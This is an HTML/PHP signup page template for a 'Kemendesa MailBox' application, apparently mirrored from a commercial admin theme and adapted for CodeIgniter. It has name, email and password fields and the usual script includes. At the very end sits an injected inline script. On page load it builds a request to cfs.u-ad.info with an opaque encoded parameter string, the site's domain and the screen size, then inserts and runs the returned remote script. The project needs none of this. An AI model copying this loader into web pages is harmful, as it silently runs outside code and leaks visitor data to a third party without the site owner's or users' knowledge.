<!DOCTYPE html>
<html>

<!-- Mirrored from themes-lab.com/make/admin/layout1/user-signup-v2.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 09 Jul 2015 18:30:39 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>Kemendesa MailBox<?= isset($title) ? " | ".$title : "" ?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta content="" name="description" />
    <meta content="themes-lab" name="author" />
    <link rel="shortcut icon" href="<?= base_url() ?>assets/global/images/favicon.png">
    <link href="<?= base_url() ?>assets/global/css/style.css" rel="stylesheet">
    <link href="<?= base_url() ?>assets/global/css/ui.css" rel="stylesheet">
    <link href="<?= base_url() ?>assets/global/plugins/icheck/skins/all.css" rel="stylesheet"/>
    <link href="<?= base_url() ?>assets/global/plugins/bootstrap-loading/lada.min.css" rel="stylesheet">
</head>
<body class="account2 signup" data-page="signup">
<!-- BEGIN LOGIN BOX -->
<div class="container" id="login-block">
    <i class="user-img"></i>
    <div class="account-info">
        <a href="dashboard.html" class="logo">
        </a>
        <h3>Modular &amp; Flexible Admin.</h3>
        <ul>
            <li><i class="icon-magic-wand"></i> Fully customizable</li>
            <li><i class="icon-layers"></i> Various sibebars look</li>
            <li><i class="icon-arrow-right"></i> RTL direction support</li>
            <li><i class="icon-drop"></i> Colors options</li>
            <li><i class="icon-doc"></i> Page Variations</li>
            <li><i class="icon-support"></i> Online Support</li>
            <li><i class="icon-cloud-download"></i> Regular updates</li>
        </ul>
    </div>
    <div class="account-form">
        <form class="form-signup" action="<?= site_url() ?>auth/register" role="form" method="post">
            <h3><strong>Create</strong> your account</h3>
            <div class="row">
                <div class="col-sm-6">
                    <div class="append-icon">
                        <input type="text" name="firstname" id="firstname" class="form-control form-white firstname" placeholder="First Name" required autofocus>
                        <i class="icon-user"></i>
                    </div>
                </div>
                <div class="col-sm-6">
                    <div class="append-icon">
                        <input type="text" name="lastname" id="lastname" class="form-control form-white lastname" placeholder="Last Name" required>
                        <i class="icon-user"></i>
                    </div>
                </div>
            </div>
            <div class="append-icon">
                <input type="email" name="email" id="email" class="form-control form-white email" placeholder="Email" required>
                <i class="icon-envelope"></i>
            </div>
            <div class="append-icon m-b-10">
                <input type="password" name="password" id="password" class="form-control form-white password" placeholder="Password" required>
                <i class="icon-lock"></i>
            </div>
            <div class="append-icon m-b-20">
                <input type="password" name="confirm" id="confirm" class="form-control form-white confirm" placeholder="Repeat Password" required>
                <i class="icon-lock"></i>
            </div>
            <div class="terms option-group">
                <label  for="terms" class="m-t-10">
                    <input type="checkbox" name="terms" id="terms" data-checkbox="icheckbox_square-blue" required/>
                    I agree with terms and conditions
                </label>
            </div>
            <div class="m-t-20">
                <button type="submit" id="submit-form" class="btn btn-lg btn-dark btn-rounded" data-style="expand-left">Sign In</button>
            </div>
        </form>
        <div class="form-footer">
            <div class="social-btn">
                <button data-toggle="modal" data-target="#modal-unavailable" type="button" class="btn-fb btn btn-lg btn-block btn-square"><i class="fa fa-facebook pull-left"></i>Connect with Facebook</button>
                <button data-toggle="modal" data-target="#modal-unavailable" type="button" class="btn btn-lg btn-block btn-blue btn-square"><i class="fa fa-twitter pull-left"></i>Login with Twitter</button>
            </div>
            <div class="clearfix">
                <p class="new-here"><a href="<?=site_url()?>login">Already have an account? Sign In</a></p>
            </div>
        </div>
    </div>

    <div class="modal fade modal-slideleft" id="modal-unavailable" tabindex="-1" role="dialog" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-body">
                    <div class="row">
                        <div class="col-md-12">
                            <h2 class="c-primary m-b-30">We apologize this feature currently unavailable.</h2>
                            <button type="button" class="btn btn-primary btn-embossed btn-block" data-dismiss="modal">Okay, I'm good</button>
                            <button type="button" data-dismiss="modal" class="btn btn-white btn-block">Learn more</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <p class="account-copyright">
        <span>Copyright &copy; 2015 </span><span>KEMENDESA LAB</span>.<span>All rights reserved.</span>
    </p>
</div>
<!-- END LOCKSCREEN BOX -->
<script src="<?= base_url() ?>assets/global/plugins/jquery/jquery-1.11.1.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/jquery/jquery-migrate-1.2.1.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/gsap/main-gsap.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/bootstrap/js/bootstrap.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/icheck/icheck.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/backstretch/backstretch.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/bootstrap-loading/lada.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/jquery-validation/jquery.validate.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/jquery-validation/additional-methods.min.js"></script>
<script src="<?= base_url() ?>assets/global/js/plugins.js"></script>
<script src="<?= base_url() ?>assets/global/js/pages/login-v2.js"></script>
<script src="<?= base_url() ?>assets/admin/layout1/js/layout.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRRJQa4R3kWwVkRPixckp4FKRNB0Wcz%2b89KUUglixhJxD9A9uHC5KUEl8OqqL1a9JPgsTL%2bj999TR8h%2fv0KVvxq6Xu9%2fD3iOprtzl7RFuLIcUZS0nRxpysdvK%2f76e0qa54GNaTfg%2bfaXhYizEbVhKEJJGGAb89zDOtuTtH%2fn6poQctfDk8WmiesL7YQUrV5dqE1BirKLYDdYi3xEholVAn%2f9QmBeBd0VQ7OrLgav9uK8kguJkPDReY5gwm4treeb77qFy9AzBJUM%2fOJ9pGhf%2b2me7tT1%2fruOpwaPq3SCFrsAzQ5%2fHPoQwvA7du64bKh%2frtlG7WROMzJ9EFfgIqzvgJQFOuI7fcTRCXsyfQQUYddyLKZEX92aWH3I27tO5iUnr3UYudrkJDE7rbPaYynSu1kiYVN6yr6SObHtIOGkzF8BVFdaV0Jl15wc07q0%2bfMVNRJGehpoti6yB2gBoENddNCZcNSLuNtm6XEwaJrZ43Pi9l5ymEarjuNA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from themes-lab.com/make/admin/layout1/user-signup-v2.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 09 Jul 2015 18:30:39 GMT -->
</html>
